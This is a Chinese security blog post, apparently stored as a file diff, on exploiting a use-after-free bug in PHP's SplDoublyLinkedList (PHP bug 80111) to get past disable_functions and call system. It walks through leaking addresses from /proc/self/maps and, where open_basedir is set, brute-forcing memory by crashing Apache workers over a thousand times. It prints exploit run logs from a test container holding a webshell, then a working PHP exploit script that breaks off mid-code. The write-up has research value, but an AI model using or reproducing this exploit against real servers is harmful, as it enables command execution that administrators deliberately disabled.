@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>PHP SplDoublyLinkedList UAF 利用 - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期二, 十月 13日 2020, 11:41 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    2.7k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      13 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>9.20+ 号在 bugs.php.net 上看到的一个 UAF BUG：<a href="https://bugs.php.net/bug.php?id=80111">https://bugs.php.net/bug.php?id=80111</a> ，报告人已经写出了 bypass disabled functions 的利用脚本并且私发了给官方，不过官方似乎还没有修复，原因不明。</p>
+<p>试了一下，bug 能在 7.4.10、7.3.22、7.2.34 版本触发，虽然报告者没有公布利用脚本，不过我们可以自己写一个。</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="触发-UAF"><a href="#触发-UAF" class="headerlink" title="触发 UAF"></a>触发 UAF</h3><p>BUG 发生在 PHP 内置类 SplDoublyLinkedList，一个双链表类，有一个指针 traverse_pointer 用于指向当前位置。</p>
+<p>在调用 unset 删除链表元素的时候，处理顺序上有点问题：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (element != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* connect the neightbors */</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* take care of head/tail */</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* finally, delete the element */</span></span><br><span class="line">    llist-&gt;count--;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(llist-&gt;dtor) &#123;</span><br><span class="line">    	llist-&gt;dtor(element);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (intern-&gt;traverse_pointer == element) &#123;</span><br><span class="line">        SPL_LLIST_DELREF(element);</span><br><span class="line">        intern-&gt;traverse_pointer = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，删除元素的操作被放在了置空 traverse_pointer 指针前。</p>
+<p>所以在删除一个对象时，我们可以在其构析函数中通过 current 访问到这个对象，也可以通过 next 访问到下一个元素。如果此时下一个元素已经被删除，就会导致 UAF。</p>
+<p>具体的触发脚本可以参考报告人给出的测试代码。</p>
+<h3 id="编写利用"><a href="#编写利用" class="headerlink" title="编写利用"></a>编写利用</h3><p>先看一下链表元素的结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">spl_ptr_llist_element</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">spl_ptr_llist_element</span> *<span class="title">prev</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">spl_ptr_llist_element</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="type">int</span>                            rc;</span><br><span class="line">	zval                           data;</span><br><span class="line">&#125; spl_ptr_llist_element;</span><br></pre></td></tr></table></figure>
+
+<p>前后指针 + 引用计数 + zval 格式的 data，加起来就是 0x28。 </p>
+<p>而最方便控制的 zend_string 结构则是这样的：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_string</span> &#123;</span></span><br><span class="line">	zend_refcounted_h gc;</span><br><span class="line">	zend_ulong        h;                <span class="comment">/* hash value */</span></span><br><span class="line">	<span class="type">size_t</span>            len;</span><br><span class="line">	<span class="type">char</span>              val[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说用一个字符串进行 UAF，我们基本可以控制元素的整个 data 部分。</p>
+<p>然后问题就来了，data 部分是个 zval，一般是个地址 + 类型的两地址单元数据，我们可以通过这里泄露某个地址的数据，但是我们没有泄露这个地址的途径。</p>
+<p>一开始我想通过 next 导致的链表元素引用计数 + 1（对应到字符串中就是字符串长度 + 1）来一个个字节地泄露出被删除元素 data 段存在的地址，结果发现 PHP 在为字符串分配地址的时候基本都会在最后加上个不算在字符串长度中的 \x00，所以这个思路也走不通了。</p>
+<p>所以最后是按照两种情况来处理，首先是没有限制 openbase_dir 的情况，可以读取 &#x2F;proc&#x2F;self&#x2F;maps 来获取地址，具体思路如下：</p>
+<ul>
+<li>在链表中放置 3 个主要元素，分别是触发构析函数的对象、用来 UAF 的元素、closure 对象</li>
+<li>读取 &#x2F;proc&#x2F;self&#x2F;maps，从中找到 PHP 申请的 Chunk（Chunk 最小为 2MB）</li>
+<li>在链表中放入一堆奇奇怪怪数据的元素，然后从 Chunk 中每 0x1000 字节搜索一次这些奇怪的元素</li>
+<li>通过该元素的前指针往前找到链表中的 closure 对象</li>
+<li>泄露出 closure handler 的地址，然后往前搜索 system 函数 handler 的地址</li>
+<li>伪造一个 closure 对象，将其 handler 设置为 system</li>
+<li>调用该 closure 对象，调用 system</li>
+</ul>
+<p>比较要注意的一点就是引用计数，具体原因可以自行调试。</p>
+<p>执行 php -v 的结果如下（Docker 镜像为 php:7.4.10-apache，上面只放了一句话 webshell）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[+]Execute Payload, Output is:</span><br><span class="line">[+]PHP Chunk: 7f026be00000 - 7f026c000000, length: 0x200000</span><br><span class="line">[+]SplDoublyLinkedList Element: 7f026be540f0</span><br><span class="line">[+]Closure Chunk: 7f026be544b0</span><br><span class="line">[+]Closure Object: 7f026be588c0</span><br><span class="line">[+]Closure Handler: 7f026d4f9780</span><br><span class="line">[+]Find system&#x27;s handler: 7f026cae9100</span><br><span class="line">[+]Executing command:</span><br><span class="line">PHP 7.4.10 (cli) (built: Sep 10 2020 13:50:32) ( NTS )</span><br><span class="line">Copyright (c) The PHP Group</span><br><span class="line">Zend Engine v3.4.0, Copyright (c) Zend Technologies</span><br><span class="line">[+]Done</span><br><span class="line">[+]Execute Payload Over.</span><br></pre></td></tr></table></figure>
+
+<p>如果限制了 openbase_dir，就比较麻烦了，因为无法直接读取到 PHP Chunk 的地址，就只能通过爆破来获取，但是每次爆破都会导致 Apache 子进程崩溃重启一次（PHP 的 Web 服务一般是父子进程的形式，所以单纯子进程重启不会影响 PHP Chunk 的地址，除非将整个 Apache&#x2F;FPM 重启），所以虽然说要爆破，但是也不能从 0x7f0000000000 开始每 0x20000 爆破一次，这样需要的爆破次数太多了。</p>
+<p>我想到的办法就是申请一个很大的 Chunk，比如 PHP 一般配置下最大内存使用为 128MB，我就申请一个 120MB 的 Chunk，而这个 Chunk 一般会排布在 Apache so 扩展、PHP Chunk 等数据的上方，所以我从 0x7f0000000000 开始每 0x8000000 爆破一次，如果没有崩溃就说明找到了这个大 Chunk，最坏的情况下需要爆破 8000+ 次。</p>
+<p>之后只要再每 0x20000 进行循环泄露出 PHP Chunk 和链表地址（偶尔会因为读取越界导致崩溃，一般不超过 100 次），后面就跟没有限制 openbase_dir 的情况一致了，一个比较快的执行结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">[+]Execute Payload, Output is:</span><br><span class="line">[+]Bomb 100 times, address of first chunk maybe: 0x7f0320000000L</span><br><span class="line">[+]Bomb 200 times, address of first chunk maybe: 0x7f0640000000L</span><br><span class="line">[+]Bomb 300 times, address of first chunk maybe: 0x7f0960000000L</span><br><span class="line">[+]Bomb 400 times, address of first chunk maybe: 0x7f0c80000000L</span><br><span class="line">[+]Bomb 500 times, address of first chunk maybe: 0x7f0fa0000000L</span><br><span class="line">[+]Bomb 600 times, address of first chunk maybe: 0x7f12c0000000L</span><br><span class="line">[+]Bomb 700 times, address of first chunk maybe: 0x7f15e0000000L</span><br><span class="line">[+]Bomb 800 times, address of first chunk maybe: 0x7f1900000000L</span><br><span class="line">[+]Bomb 900 times, address of first chunk maybe: 0x7f1c20000000L</span><br><span class="line">[+]Bomb 1000 times, address of first chunk maybe: 0x7f1f40000000L</span><br><span class="line">[+]Bomb 1100 times, address of first chunk maybe: 0x7f2260000000L</span><br><span class="line">[+]Bomb 1200 times, address of first chunk maybe: 0x7f2580000000L</span><br><span class="line">[+]Bomb 1300 times, address of first chunk maybe: 0x7f28a0000000L</span><br><span class="line">[+]Bomb 1400 times, address of first chunk maybe: 0x7f2bc0000000L</span><br><span class="line">---------------------------------------------------------------------------------</span><br><span class="line">[+]Bomb 10 times, address of php chunk maybe: 0x7f2e51400000L</span><br><span class="line">[+]Bomb 20 times, address of php chunk maybe: 0x7f2e52800000L</span><br><span class="line">[+]Bomb 30 times, address of php chunk maybe: 0x7f2e53c00000L</span><br><span class="line">[+]Bomb 40 times, address of php chunk maybe: 0x7f2e55000000L</span><br><span class="line">[+]Bomb 50 times, address of php chunk maybe: 0x7f2e56400000L</span><br><span class="line">[+]Bomb 60 times, address of php chunk maybe: 0x7f2e57800000L</span><br><span class="line">[+]Bomb 70 times, address of php chunk maybe: 0x7f2e58c00000L</span><br><span class="line">[+]PHP crash 14 times</span><br><span class="line">---------------------------------------------------------------------------------</span><br><span class="line">[+]SplDoublyLinkedList Element: 7f2e596540f0</span><br><span class="line">[+]Closure Chunk: 7f2e596544b0</span><br><span class="line">[+]Closure Object: 7f2e59658b40</span><br><span class="line">[+]Find system&#x27;s handler: 7f2e5a310100</span><br><span class="line">[+]Executing command:</span><br><span class="line">PHP 7.4.10 (cli) (built: Sep 10 2020 13:50:32) ( NTS )</span><br><span class="line">Copyright (c) The PHP Group</span><br><span class="line">Zend Engine v3.4.0, Copyright (c) Zend Technologies</span><br><span class="line">[+]Done</span><br><span class="line">[+]Execute Payload Over.</span><br></pre></td></tr></table></figure>
+
+<p>崩溃了 1400+ 次。</p>
+<h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><p>PHP 部分（仅在 7.4.10、7.3.22、7.2.34 版本测试），写的比较烂，师傅们凑合着看一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;T&quot;</span>, <span class="number">120</span> * <span class="number">1024</span> * <span class="number">1024</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2s</span>(<span class="params">&amp;<span class="variable">$a</span>, <span class="variable">$p</span>, <span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt; <span class="variable">$x</span>;<span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$a</span>[<span class="variable">$p</span> + <span class="variable">$j</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">s2i</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>;<span class="variable">$x</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>);<span class="variable">$x</span>++) &#123;</span><br><span class="line">        <span class="variable">$result</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$result</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$x</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">&amp;<span class="variable">$a</span>, <span class="variable">$address</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="title function_ invoke__">i2s</span>(<span class="variable">$a</span>, <span class="number">0x00</span>, <span class="variable">$address</span> - <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span> -&gt; <span class="title function_ invoke__">current</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPHPChunk</span>(<span class="params"><span class="variable">$maps</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/([0-9a-f]+\-[0-9a-f]+) rw\-p 00000000 00:00 0 /&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$pattern</span>, <span class="variable">$maps</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$match</span>[<span class="number">1</span>] <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$start</span>, <span class="variable">$end</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;-&quot;</span>, <span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$length</span> = <span class="title function_ invoke__">s2i</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="variable">$end</span>)) - <span class="title function_ invoke__">s2i</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="variable">$start</span>))) &gt;= <span class="number">0x200000</span> &amp;&amp; <span class="variable">$length</span> &lt;= <span class="number">0x300000</span>) &#123;</span><br><span class="line">            <span class="variable">$address</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">s2i</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="variable">$start</span>)), <span class="title function_ invoke__">s2i</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="variable">$end</span>)), <span class="variable">$length</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;[+]PHP Chunk: &quot;</span> . <span class="variable">$start</span> . <span class="string">&quot; - &quot;</span> . <span class="variable">$end</span> . <span class="string">&quot;, length: 0x&quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$length</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bomb1</span>(<span class="params">&amp;<span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">leak</span>(<span class="variable">$a</span>, <span class="title function_ invoke__">s2i</span>(<span class="variable">$_GET</span>[<span class="string">&quot;test1&quot;</span>])) === <span class="number">0x5454545454545454</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="title function_ invoke__">s2i</span>(<span class="variable">$_GET</span>[<span class="string">&quot;test1&quot;</span>]) &amp; <span class="number">0x7ffff0000000</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Where is here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bomb2</span>(<span class="params">&amp;<span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">s2i</span>(<span class="variable">$_GET</span>[<span class="string">&quot;test2&quot;</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">getElement</span>(<span class="variable">$a</span>, <span class="keyword">array</span>(<span class="variable">$start</span>, <span class="variable">$start</span> + <span class="number">0x200000</span>, <span class="number">0x200000</span>));</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;[!]Not Found&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getElement</span>(<span class="params">&amp;<span class="variable">$a</span>, <span class="variable">$address</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>;<span class="variable">$x</span> &lt; (<span class="variable">$address</span>[<span class="number">2</span>] / <span class="number">0x1000</span> - <span class="number">2</span>);<span class="variable">$x</span>++) &#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="number">0x108</span> + <span class="variable">$address</span>[<span class="number">0</span>] + <span class="number">0x1000</span> * <span class="variable">$x</span> + <span class="number">0x1000</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>;<span class="variable">$y</span> &lt; <span class="number">5</span>;<span class="variable">$y</span>++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">leak</span>(<span class="variable">$a</span>, <span class="variable">$addr</span> + <span class="variable">$y</span> * <span class="number">0x08</span>) === <span class="number">0x1234567812345678</span> &amp;&amp; ((<span class="title function_ invoke__">leak</span>(<span class="variable">$a</span>, <span class="variable">$addr</span> + <span class="variable">$y</span> * <span class="number">0x08</span> - <span class="number">0x08</span>) &amp; <span class="number">0xffffffff</span>) === <span class="number">0x01</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;[+]SplDoublyLinkedList Element: &quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$addr</span> + <span class="variable">$y</span> * <span class="number">0x08</span> - <span class="number">0x18</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span> + <span class="variable">$y</span> * <span class="number">0x08</span> - <span class="number">0x18</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getClosureChunk</span>(<span class="params">&amp;<span class="variable">$a</span>, <span class="variable">$address</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">	    <span class="variable">$address</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$a</span>, <span class="variable">$address</span>);</span><br><span class="line">    &#125;<span class="keyword">while</span>(<span class="title function_ invoke__">leak</span>(<span class="variable">$a</span>, <span class="variable">$address</span>) !== <span class="number">0x00</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Closure Chunk: &quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$address</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSystem</span>(<span class="params">&amp;<span class="variable">$a</span>, <span class="variable">$address</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="variable">$address</span> &amp; <span class="number">0xffffffffffff0000</span>;</span><br><span class="line">    <span class="variable">$lowestAddr</span> = (<span class="variable">$address</span> &amp; <span class="number">0x0000fffffff00000</span>) - <span class="number">0x0000000001000000</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span 